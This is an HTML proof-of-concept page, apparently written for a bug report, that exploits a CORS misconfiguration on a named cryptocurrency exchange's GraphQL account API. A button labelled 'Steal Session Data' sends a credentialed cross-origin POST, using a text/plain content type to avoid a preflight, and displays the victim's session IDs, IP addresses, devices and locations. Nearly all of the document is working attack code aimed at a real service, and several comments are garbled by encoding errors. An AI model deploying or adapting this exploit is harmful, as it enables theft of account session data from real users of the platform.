<!DOCTYPE html>

<body>

<h2>CORS Misconfiguration â€“ GraphQL POST (No Preflight)</h2>
<button id="run">Steal Session Data</button>
<pre id="out">Click the buttonâ€¦</pre>

<script>
document.getElementById("run").onclick = function () {

  const target = "https://profile.cex.io/account-api/graphql";
  const out = document.getElementById("out");

  out.textContent = "Sending POST request WITHOUT preflight...\n";

  const xhr = new XMLHttpRequest();
  xhr.open("POST", target, true);

  // ðŸ”¥ Ø§Ù„Ù…Ù‡Ù…
  xhr.withCredentials = true;

  // âœ… Simple Content-Type â†’ no OPTIONS
  xhr.setRequestHeader("Content-Type", "text/plain");

  xhr.onreadystatechange = function () {
    if (xhr.readyState === 4) {
      out.textContent =
        "STATUS: " + xhr.status + " " + xhr.statusText + "\n\n" +
        "RESPONSE HEADERS:\n" +
        xhr.getAllResponseHeaders() + "\n\n" +
        "RESPONSE BODY:\n" +
        xhr.responseText;

      console.log("CORS PoC response:", xhr.responseText);
    }
  };

  // GraphQL body Ø¹Ø§Ø¯ÙŠ
  const body = `
{
  "query": "{
    sessionManager {
      device
      deviceType
      ip
      lastActiveTime
      sessionId
      isCurrent
      location
    }
  }"
}
`;

  xhr.send(body);
};
</script>
